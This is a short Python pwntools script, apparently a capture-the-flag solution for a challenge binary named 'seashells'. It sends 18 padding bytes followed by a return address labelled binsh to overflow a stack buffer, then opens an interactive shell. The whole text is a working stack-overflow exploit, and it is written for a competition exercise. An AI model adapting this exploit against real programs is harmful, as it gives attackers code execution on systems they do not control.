from pwn import *
binsh = 0x4006E3
to_r = 0xA+8
r = process('./seashells')
#r = remote('p1.tjctf.org', 8009)
r.sendlineafter('?\n', to_r*'A' + p64(binsh))
r.interactive()

